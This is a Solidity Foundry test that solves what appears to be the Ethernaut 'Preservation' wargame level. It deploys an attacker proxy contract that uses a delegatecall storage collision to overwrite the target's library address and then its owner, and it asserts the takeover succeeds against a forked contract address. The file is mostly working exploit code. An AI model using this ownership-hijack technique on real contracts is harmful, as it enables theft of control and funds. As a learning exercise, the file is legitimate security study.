// SPDX-License-Identifier: UNLICENSED

// forge test --contracts src/test/King.t.sol --fork-url $rpc -vvvv
pragma solidity ^0.6.0;

import "ds-test/test.sol";
import "forge-std/console.sol";
import "forge-std/Vm.sol";
import "../Preservation.sol";

contract ProxyPreservation {
    address public timeZone1Library;
    address public timeZone2Library;
    address public owner; 

    Preservation obj;
    
    constructor(address addr) public {
        obj = Preservation(addr);
    }

    function setTime(uint _time) public {
        owner = address(uint160(_time));
    }
    function hackSlot0and3() public {
        obj.setFirstTime(uint256(uint160(address(this))));
        obj.setFirstTime(uint256(uint160(msg.sender)));
    }
}
contract PreservationTest is DSTest {
    Preservation obj;
    ProxyPreservation proxy_Preservation;
    Vm vm = Vm(HEVM_ADDRESS);
    address payable player_address;
    address contract_address;
    function setUp() public {
        contract_address = 0xb659cC81A7A112f3aE4070351471c91b75E0ec88;
        player_address = 0xae22f26D5ddfE22d24aA28AEB1D44c962c673438;
        obj = Preservation(contract_address);
        // obj = new Preservation(player_address);
        proxy_Preservation = new ProxyPreservation(address(obj));
    }

    function testPreservation() public {
        vm.startPrank(player_address);
        console.log("Proxy Preservation Address =", address(proxy_Preservation));
        console.log("Initial owner =", obj.owner());
        console.logBytes32(vm.load(contract_address, bytes32(uint256(0))));
        proxy_Preservation.hackSlot0and3();
        console.logBytes32(vm.load(contract_address, bytes32(uint256(0))));
        console.log("End owner =", obj.owner());
        assert(obj.owner() == player_address);
    }
}
